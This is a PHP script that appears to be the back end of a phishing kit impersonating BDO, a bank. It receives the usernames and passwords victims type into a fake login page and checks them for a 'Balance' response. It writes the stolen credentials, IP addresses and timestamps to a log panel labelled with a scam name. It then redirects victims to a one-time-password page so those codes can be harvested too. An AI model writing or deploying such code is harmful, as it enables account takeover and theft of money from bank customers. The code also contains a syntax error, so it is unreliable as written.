<?php
include("../settings/config.php");
   sleep(3);
   function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
  $username = $_GET['user'];
$password = $_GET['pass'];

$message = $result = file_get_contents('https://localhost/?user='.$username'&pass='.$password);

if(strpos($message, 'Balance')){
            date_default_timezone_set('Asia/Manila');
$time = date('g:i:a');
        $ip = $_SERVER['REMOTE_ADDR'];

$hostname = gethostbyaddr($ip);
$bilsmg .= "-----------------------[+]".$scamname."[+]------------------------\n";
$bilsmg .= "UserID: ".$username."\n";
$bilsmg .= "Online Password: ".$password."\n";
$bilsmg .= "Ip Addres: ".$ip."\n";
$bilsmg .= "Time: ".$time."\n";
$bilsmg .= "---------------------------[+] BDO LOGS [+]]----------------------\n";
        
$bilsub = "BDO RezultX from ".$ip;
$bilhead .= "MIME-Version: 2.0\n";

    $date = date("F j, Y");
    $fp = fopen("../zult.php", "a");
fputs($fp, "    <tr>
                <td><a href='./reziplog/$ip.html' style='text-decoration: none' target='_blank'><font color='red'>$ip</font></a></td>
                <td><font color='red'>$time</font></td>
                <td><font color='red'>$date</font></td>
                </tr>


\n");
$fp = fopen('../reziplog/'.$ip.'.html', "a");
fputs($fp, " <meta http-equiv='refresh' content='5; URL=./$ip.html'>
    <center>
            <body style='background-color:#121212;'>

         <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>

<font color='red'><fieldset><legend> BDO ACCOUNT </legend>      
      <font color='gren'> ==================[<font color='red'>+</font>] <font color='cyan'>[$scamname] </font>[<font color='red'>+</font>]==================</font><br>
       <font color='white'>  IP Address: </font><font color='red'> $ip<br></font>
       <font color='white'>  UserID: </font><font color='red'> $username<br></font>
        <font color='white'> Password: </font><font color='red'> $password<br></font>
        <font color='white'> Time: </font><font color='red'> $time<br></font>
        <font color='white'> Date: </font><font color='red'> $date<br></font>
      <font color='gren'> ===================[<font color='red'>+</font>] <font color='cyan'>[BDO LOGS]</font> [<font color='red'>+</font>]===================</font><br><br>
</fieldset></font>
<br>
<hr>
<br>
\n");
function generateRandomString($length) {
    $include_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    /* Uncomment below to include symbols */
    /* $include_chars .= "[{(!@#$%^/&*_+;?\:)}]"; */
    $charLength = strlen($include_chars);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $include_chars [rand(0, $charLength - 1)];
    }
    return $randomString;
}
 
// Call function
$lenght = 200; # Set result string lenght
$codebash = generateRandomString($lenght);


header("location:../otp?param1=true");
}else{
header("location:../login?/wicket:interface/:30:loginUnifiedPanel:loginForm::IFormSubmitListener::=1");
}
?>